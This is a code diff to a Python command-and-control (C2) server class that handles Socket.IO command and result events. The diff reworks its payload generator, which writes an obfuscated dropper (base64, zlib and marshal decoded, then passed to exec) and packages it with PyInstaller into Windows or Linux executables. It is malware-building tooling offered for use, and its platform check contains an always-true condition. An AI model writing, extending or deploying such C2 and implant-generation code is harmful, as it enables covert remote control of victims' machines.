@@ -21,8 +21,6 @@ class C2:
         self.sio.on('disconnect', self.on_disconect)
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
-        self.generate("Windows")
-
 
 
     def on_connect(self, sid, data):
@@ -128,6 +126,9 @@ class C2:
 
 
     def generate(self, generate):
+        os_name = generate['os']
+        arch = generate['arch']
+
         if not os.path.isdir('payloads'):
             os.makedirs('payloads')
 
@@ -141,20 +142,18 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
 
         
         system = platform.system()
-        payload_file_name = f"payload-{system}-{uuid.uuid4()}"
+        payload_file_name = f"payload-{os_name}-{arch}-{uuid.uuid4()}"
 
         with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
         
-        if system == generate:
-            print("just pyinstaller")
 
-        elif generate == "Windows":
+        if os_name == "Windows":
             result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
             shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
-        elif generate == "Darwin" or "Linux":
+        elif os_name == "Darwin" or "Linux":
             result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
             shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
